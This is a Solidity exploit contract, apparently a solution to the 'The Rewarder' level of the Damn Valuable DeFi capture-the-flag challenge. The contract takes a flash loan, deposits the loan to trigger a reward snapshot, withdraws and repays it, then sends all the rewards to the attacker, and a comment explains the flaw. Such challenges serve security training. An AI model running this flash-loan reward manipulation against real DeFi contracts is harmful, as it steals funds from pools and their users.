// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "hardhat/console.sol";
import { RewardToken } from "./RewardToken.sol";

contract AttackRewarder {
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public rewardsPool;
    FlashLoanerPool public flashLoanerPool;
    RewardToken public rewardToken;
    address public _attacker;

    constructor(address _liquidityTokenAddress, address _rewardsPool, address _flashLoanerPool, address _rewardToken) {
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        rewardsPool = TheRewarderPool(_rewardsPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function execute() public  {
        // take out flash loan
        _attacker = msg.sender;
        uint flashLoanAmount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(flashLoanAmount);
    }

    function receiveFlashLoan(uint256 _amount) public {
        // execute what you want to do with the tokens here that you get flash loaned
        liquidityToken.approve(address(rewardsPool), _amount); // approve so pool can do a tranferfrom
        rewardsPool.deposit(_amount); // deposit to take snapshot and trigger distributeRewards()
        rewardsPool.withdraw(_amount); // withdraw your liquidity tokens back
        liquidityToken.transfer(address(flashLoanerPool), _amount); // payback flashloan

        // transfer all the rewards to our attacker address
        uint rewardsAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(_attacker, rewardsAmount);
    }
}

/*
    - goal is to claim all the rewards from the rewarderPool
    - you can take out a flash loan and invoke the deposit function to deposit a very large amount
    - the vulnerability is that deposit() will record a snapshot and distribute rewards as long as the round has passed (5 days)
    - so if you invoke deposit() after 5 days of the last round, you can get all the rewards equivalent to the very large amount you deposited with the flash loan
*/